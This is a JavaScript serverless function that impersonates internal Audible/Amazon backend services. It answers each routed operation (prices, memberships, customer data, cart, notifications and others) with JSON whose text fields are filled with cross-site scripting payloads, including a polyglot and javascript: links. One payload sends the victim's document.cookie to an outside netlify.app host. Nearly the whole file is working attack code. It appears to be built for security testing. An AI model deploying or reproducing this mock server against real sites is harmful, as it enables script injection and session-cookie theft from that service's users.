exports.handler = async (event) => {
  // Log the incoming request for debugging
  const headers = event.headers || {};
  const target = headers['x-amz-target'] || headers['x-amzn-target'] || '';
  const contentType = headers['content-type'] || '';
  const path = event.path || '';
  const body = event.body || '';

  console.log('=== Incoming Request ===');
  console.log('Path:', path);
  console.log('Method:', event.httpMethod);
  console.log('Target:', target);
  console.log('Content-Type:', contentType);
  console.log('Headers:', JSON.stringify(headers, null, 2));
  console.log('Body:', body.substring(0, 500));

  // Handle OPTIONS preflight
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers: {
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Headers": "*",
        "Access-Control-Allow-Methods": "POST, GET, OPTIONS, PUT"
      },
      body: ''
    };
  }

  // XSS Payloads - vary these to test different rendering contexts
  const XSS = {
    img: '<img src=x onerror="alert(document.domain)">',
    svg: '<svg/onload=alert(document.domain)>',
    script: '<script>alert(document.domain)</script>',
    iframe: '<iframe src="javascript:alert(document.domain)"></iframe>',
    event: '" onmouseover="alert(document.domain)" data-x="',
    steal: '<img src=x onerror="new Image().src=\'https://comfy-daffodil-485f41.netlify.app/steal?c=\'+document.cookie">',
    polyglot: 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert(document.domain) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(document.domain)//>'
  };

  let response;

  // Route based on x-amz-target header (Coral operation routing)
  if (target.includes('getPrices') || target.includes('PriceAggregator')) {
    response = buildGetPricesResponse(XSS);
  } else if (target.includes('saleDetailsByTag') || (target.includes('PriceAggregator') && body.includes('saleDetailsByTag'))) {
    response = buildSaleDetailsByTagResponse(XSS);
  } else if (target.includes('getMemberships') || target.includes('MembershipInformation')) {
    response = buildGetMembershipsResponse(XSS);
  } else if (target.includes('GetMembershipPlanDetails') || target.includes('MembershipDataServiceV2')) {
    response = buildGetMembershipPlanDetailsResponse(XSS);
  } else if (target.includes('GetCustomerStatus') || (target.includes('AccountData') && body.includes('CustomerStatus'))) {
    response = buildGetCustomerStatusResponse(XSS);
  } else if (target.includes('getWidgets') || target.includes('RecommenderStrategy')) {
    response = buildGetWidgetsResponse(XSS);
  } else if (target.includes('findExtraCreditOffers') || target.includes('SaleEligibility')) {
    response = buildFindExtraCreditOffersResponse(XSS);
  } else if (target.includes('GetCustomerIdMapping') || target.includes('CustomerAttribute')) {
    response = buildGetCustomerIdMappingResponse(XSS);
  } else if (target.includes('GetDynamicPages') || target.includes('DynamicRanking')) {
    response = buildGetDynamicPagesResponse(XSS);
  } else if (target.includes('GetProducts') || target.includes('CatalogData')) {
    response = buildGetProductsResponse(XSS);
  } else if (target.includes('GetCustomerInformation') || (target.includes('AccountData') && body.includes('CustomerInformation'))) {
    response = buildGetCustomerInformationResponse(XSS);
  } else if (target.includes('getCreditSummary') || (target.includes('MembershipInformation') && body.includes('creditSummary'))) {
    response = buildGetCreditSummaryResponse(XSS);
  } else if (target.includes('getCartCount') || target.includes('CartService')) {
    response = buildGetCartCountResponse(XSS);
  } else if (target.includes('GetCOR') || (target.includes('CustomerAttribute') && body.includes('COR'))) {
    response = buildGetCORResponse(XSS);
  } else if (target.includes('getCustomerNotifications') || target.includes('CustomerOnboarding')) {
    response = buildGetCustomerNotificationsResponse(XSS);
  } else if (target.includes('GetIPInfo') || target.includes('IPLocationScout')) {
    response = buildGetIPInfoResponse(XSS);
  } else {
    // Default fallback
    response = buildGenericResponse(XSS, target, body);
  }

  return {
    statusCode: 200,
    headers: {
      "Content-Type": "application/json",
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Headers": "*",
      "Access-Control-Allow-Methods": "POST, GET, OPTIONS",
      "x-amzn-RequestId": "fake-xss-test-" + Date.now()
    },
    body: JSON.stringify(response)
  };
};

// ============================================================
// AudiblePriceAggregatorService::getPrices
// Returns pricing info displayed in buy boxes and product pages
// ============================================================
function buildGetPricesResponse(XSS) {
  return {
    "Output": {
      "__type": "com.amazon.audiblepriceaggregatorservice#GetPricesResponse",
      "prices": [
        {
          "asin": "B0GXGLXFWR",
          "listPrice": {
            "amount": "29.99",
            "currency": "USD",
            "displayText": XSS.img
          },
          "memberPrice": {
            "amount": "0.00",
            "currency": "USD",
            "displayText": XSS.svg
          },
          "savingsMessage": XSS.img,
          "promotionalText": XSS.script,
          "priceType": "REGULAR",
          "creditEligible": true
        }
      ]
    },
    "Version": "1.0"
  };
}

// ============================================================
// AudiblePriceAggregatorService::saleDetailsByTag
// Returns sale/promotion display info
// ============================================================
function buildSaleDetailsByTagResponse(XSS) {
  return {
    "Output": {
      "__type": "com.amazon.audiblepriceaggregatorservice#SaleDetailsByTagResponse",
      "saleDetails": [
        {
          "tag": "summer-sale-2025",
          "title": XSS.img,
          "description": XSS.script,
          "bannerText": XSS.svg,
          "discountPercentage": 50,
          "startDate": "2025-06-01T00:00:00Z",
          "endDate": "2025-08-31T23:59:59Z",
          "ctaText": XSS.img,
          "ctaUrl": "javascript:alert(document.domain)"
        }
      ]
    },
    "Version": "1.0"
  };
}

// ============================================================
// AudibleMembershipInformationService::getMemberships
// Returns membership status/plan info displayed on account pages
// ============================================================
function buildGetMembershipsResponse(XSS) {
  return {
    "Output": {
      "__type": "com.amazon.audiblemembershipinformationservice#GetMembershipsResponse",
      "memberships": [
        {
          "membershipId": "mem-xss-001",
          "planName": XSS.img,
          "planDescription": XSS.script,
          "status": "ACTIVE",
          "startDate": "2024-01-01T00:00:00Z",
          "nextBillingDate": "2025-07-15T00:00:00Z",
          "price": {
            "amount": "14.95",
            "currency": "USD",
            "displayText": XSS.svg
          },
          "benefits": [
            XSS.img,
            "1 credit per month " + XSS.svg
          ],
          "tierName": XSS.img
        }
      ]
    },
    "Version": "1.0"
  };
}

// ============================================================
// AudibleApiMembershipDataServiceV2::GetMembershipPlanDetails
// Returns plan details for membership pages
// ============================================================
function buildGetMembershipPlanDetailsResponse(XSS) {
  return {
    "Output": {
      "__type": "com.amazon.audibleapimembershipdataservicev2#GetMembershipPlanDetailsResponse",
      "plans": [
        {
          "planId": "plan-gold-monthly",
          "planName": XSS.img,
          "planDescription": XSS.script,
          "price": {
            "amount": "14.95",
            "displayText": XSS.svg
          },
          "creditsPerMonth": 1,
          "trialDays": 30,
          "features": [
            XSS.img,
            "Access to Plus Catalog " + XSS.svg,
            XSS.script
          ],
          "promotionalBadge": XSS.img,
          "savingsText": XSS.svg
        },
        {
          "planId": "plan-platinum-annual",
          "planName": "Platinum Annual " + XSS.svg,
          "planDescription": "24 credits per year " + XSS.img,
          "price": {
            "amount": "149.50",
            "displayText": XSS.img
          },
          "creditsPerMonth": 2,
          "features": [
            XSS.script
          ]
        }
      ]
    },
    "Version": "1.0"
  };
}

// ============================================================
// AudibleApiAccountDataService::GetCustomerStatus
// Returns customer account status
// ============================================================
function buildGetCustomerStatusResponse(XSS) {
  return {
    "Output": {
      "__type": "com.amazon.audibleapiaccountdataservice#GetCustomerStatusResponse",
      "customerStatus": {
        "customerId": "cust-xss-001",
        "status": "ACTIVE",
        "statusMessage": XSS.img,
        "memberSince": "2020-03-15T00:00:00Z",
        "marketplace": "US",
        "displayName": XSS.svg,
        "tierName": XSS.img,
        "accountAlerts": [
          {
            "alertType": "INFO",
            "message": XSS.script,
            "ctaText": XSS.img,
            "ctaUrl": "javascript:alert(document.domain)"
          }
        ]
      }
    },
    "Version": "1.0"
  };
}

// ============================================================
// RecommenderStrategyService::getWidgets
// Returns widget/carousel content for homepage and browse pages
// ============================================================
function buildGetWidgetsResponse(XSS) {
  return {
    "Output": {
      "__type": "com.amazon.recommenderstrategyservice#GetWidgetsResponse",
      "widgets": [
        {
          "widgetId": "widget-xss-1",
          "widgetType": "CAROUSEL",
          "title": XSS.img,
          "subtitle": XSS.svg,
          "items": [
            {
              "asin": "B0RECXSS01",
              "title": XSS.img,
              "author": XSS.svg,
              "narrator": XSS.img,
              "imageUrl": "https://m.media-amazon.com/images/I/placeholder.jpg",
              "rating": 4.5,
              "reasoning": "Because you enjoyed " + XSS.img
            },
            {
              "asin": "B0RECXSS02",
              "title": XSS.script,
              "author": "Author " + XSS.event,
              "imageUrl": "https://m.media-amazon.com/images/I/placeholder.jpg",
              "rating": 4.8,
              "reasoning": XSS.svg
            }
          ],
          "seeMoreText": XSS.img,
          "seeMoreUrl": "javascript:alert(document.domain)"
        },
        {
          "widgetId": "widget-xss-2",
          "widgetType": "BANNER",
          "title": XSS.svg,
          "html": "<div class='promo-banner'>" + XSS.script + "</div>",
          "content": XSS.polyglot
        }
      ]
    },
    "Version": "1.0"
  };
}

// ============================================================
// AudibleSaleEligibilityAndOfferService::findExtraCreditOffers
// Returns extra credit purchase options
// ============================================================
function buildFindExtraCreditOffersResponse(XSS) {
  return {
    "Output": {
      "__type": "com.amazon.audiblesaleeligibilityandofferservice#FindExtraCreditOffersResponse",
      "offers": [
        {
          "offerId": "offer-xss-1",
          "offerName": XSS.img,
          "description": XSS.script,
          "credits": 3,
          "price": {
            "amount": "35.88",
            "displayText": XSS.svg
          },
          "savingsText": XSS.img,
          "promotionalBadge": XSS.svg,
          "eligibilityMessage": XSS.img
        },
        {
          "offerId": "offer-xss-2",
          "offerName": "1 Extra Credit " + XSS.svg,
          "description": "Add a credit to your account " + XSS.img,
          "credits": 1,
          "price": {
            "amount": "14.95",
            "displayText": XSS.img
          }
        }
      ]
    },
    "Version": "1.0"
  };
}

// ============================================================
// AudibleCustomerAttributeService::GetCustomerIdMapping
// Returns customer ID mapping data
// ============================================================
function buildGetCustomerIdMappingResponse(XSS) {
  return {
    "Output": {
      "__type": "com.amazon.audiblecustomerattributeservice#GetCustomerIdMappingResponse",
      "mapping": {
        "customerId": "cust-xss-001",
        "directedId": "amzn1.account.XSS_TEST_ID",
        "marketplace": "ATVPDKIKX0DER",
        "displayName": XSS.img,
        "email": XSS.svg,
        "accountType": "STANDARD"
      }
    },
    "Version": "1.0"
  };
}

// ============================================================
// AudibleDynamicRankingService::GetDynamicPages
// Returns page configuration with slot/zone content
// ============================================================
function buildGetDynamicPagesResponse(XSS) {
  return {
    "Output": {
      "__type": "com.amazon.audibledynamicrankingservice#GetDynamicPagesResponse",
      "dynamicPageKeys": [
        {
          "pageType": XSS.img,
          "pageId": XSS.svg
        },
        {
          "pageType": "homepage",
          "pageId": XSS.script
        },
        {
          "pageType": XSS.script,
          "pageId": "category-bestsellers"
        }
      ]
    },
    "Version": "1.0"
  };
}

// ============================================================
// AudibleApiCatalogDataService::GetProducts
// Returns product metadata (titles, descriptions, authors)
// ============================================================
function buildGetProductsResponse(XSS) {
  return {
    "Output": {
      "__type": "com.amazon.audibleapicatalogdata#GetProductsResponse",
      "products": [
        {
          "asin": "B0GXGLXFWR",
          "title": XSS.img,
          "subtitle": XSS.svg,
          "authors": [
            {"name": XSS.img, "asin": "AUTHXSS01"}
          ],
          "narrators": [
            {"name": XSS.svg}
          ],
          "description": "<p>" + XSS.script + "</p>",
          "publisher": XSS.img,
          "release_date": "2025-01-01",
          "language": "en-US",
          "runtime_length_min": 300,
          "format_type": "unabridged",
          "product_images": {
            "500": "https://m.media-amazon.com/images/I/placeholder.jpg"
          },
          "series": [
            {"title": XSS.img, "asin": "SERIESXSS", "sequence": "1"}
          ],
          "categories": [
            {"name": XSS.svg, "id": "cat-xss"}
          ]
        }
      ]
    },
    "Version": "1.0"
  };
}

// ============================================================
// AudibleApiAccountDataService::GetCustomerInformation
// Returns PII-rich customer data (name, email, etc.)
// ============================================================
function buildGetCustomerInformationResponse(XSS) {
  return {
    "Output": {
      "__type": "com.amazon.audibleapiaccountdataservice#GetCustomerInformationResponse",
      "customerInformation": {
        "customerId": "cust-xss-001",
        "firstName": XSS.img,
        "lastName": XSS.svg,
        "email": XSS.img,
        "displayName": XSS.script,
        "marketplace": "US",
        "locale": "en_US",
        "memberSince": "2020-03-15T00:00:00Z",
        "accountStatus": "ACTIVE"
      }
    },
    "Version": "1.0"
  };
}

// ============================================================
// AudibleMembershipInformationService::getCreditSummary
// Returns credit balance info displayed on account/library pages
// ============================================================
function buildGetCreditSummaryResponse(XSS) {
  return {
    "Output": {
      "__type": "com.amazon.audiblemembershipinformationservice#GetCreditSummaryResponse",
      "creditSummary": {
        "availableCredits": 3,
        "creditDisplayText": XSS.img,
        "nextCreditDate": "2025-07-15T00:00:00Z",
        "nextCreditMessage": XSS.svg,
        "expiringCredits": [
          {
            "count": 1,
            "expirationDate": "2025-08-01T00:00:00Z",
            "expirationMessage": XSS.img
          }
        ],
        "promotionalMessage": XSS.script
      }
    },
    "Version": "1.0"
  };
}

// ============================================================
// AudibleCartService::getCartCount
// Returns cart item count for nav badge
// ============================================================
function buildGetCartCountResponse(XSS) {
  return {
    "Output": {
      "__type": "com.amazon.audiblecartservice#GetCartCountResponse",
      "cartCount": 99,
      "displayText": XSS.img,
      "cartBadgeHtml": XSS.script
    },
    "Version": "1.0"
  };
}

// ============================================================
// AudibleCustomerAttributeService::GetCOR
// Returns Customer of Record data
// ============================================================
function buildGetCORResponse(XSS) {
  return {
    "Output": {
      "__type": "com.amazon.audiblecustomerattributeservice#GetCORResponse",
      "cor": {
        "customerId": "cust-xss-001",
        "countryOfResidence": XSS.img,
        "marketplace": "ATVPDKIKX0DER",
        "displayName": XSS.svg,
        "accountLabel": XSS.img,
        "territory": XSS.script
      }
    },
    "Version": "1.0"
  };
}

// ============================================================
// AudibleCustomerOnboardingService::getCustomerNotifications
// Returns notifications/banners displayed on pages
// ============================================================
function buildGetCustomerNotificationsResponse(XSS) {
  return {
    "Output": {
      "__type": "com.amazon.audiblecustomeronboarding#GetCustomerNotificationsResponse",
      "notifications": [
        {
          "notificationId": "notif-xss-1",
          "type": "BANNER",
          "title": XSS.img,
          "message": XSS.script,
          "htmlContent": "<div class='notification-banner'>" + XSS.script + "</div>",
          "ctaText": XSS.svg,
          "ctaUrl": "javascript:alert(document.domain)",
          "dismissible": true,
          "priority": 1
        },
        {
          "notificationId": "notif-xss-2",
          "type": "MODAL",
          "title": "Welcome back! " + XSS.svg,
          "message": "Check out what's new " + XSS.img,
          "htmlContent": "<div>" + XSS.polyglot + "</div>",
          "ctaText": "Explore " + XSS.event,
          "dismissible": false,
          "priority": 2
        }
      ]
    },
    "Version": "1.0"
  };
}

// ============================================================
// IPLocationScoutService::GetIPInfo
// Returns IP geolocation data
// ============================================================
function buildGetIPInfoResponse(XSS) {
  return {
    "Output": {
      "__type": "com.amazon.iplocationscoutservice#GetIPInfoResponse",
      "ipInfo": {
        "ipAddress": "192.168.1.1",
        "country": XSS.img,
        "countryCode": "US",
        "region": XSS.svg,
        "city": XSS.img,
        "postalCode": "98101",
        "latitude": 47.6062,
        "longitude": -122.3321,
        "isp": XSS.script,
        "isVpn": false,
        "isInternal": true
      }
    },
    "Version": "1.0"
  };
}

// ============================================================
// Generic fallback for unrecognized operations
// ============================================================
function buildGenericResponse(XSS, target, body) {
  return {
    "Output": {
      "__type": "com.amazon.generic#GenericResponse",
      "result": {
        "title": XSS.img,
        "content": XSS.script,
        "description": XSS.svg,
        "html": "<div>" + XSS.script + "</div>",
        "name": XSS.img,
        "text": XSS.polyglot,
        "displayText": XSS.img,
        "message": XSS.svg,
        "items": [
          {
            "title": XSS.img,
            "body": XSS.script,
            "content": XSS.svg
          }
        ]
      },
      "metadata": {
        "requestTarget": target,
        "timestamp": new Date().toISOString()
      }
    },
    "Version": "1.0"
  };
}
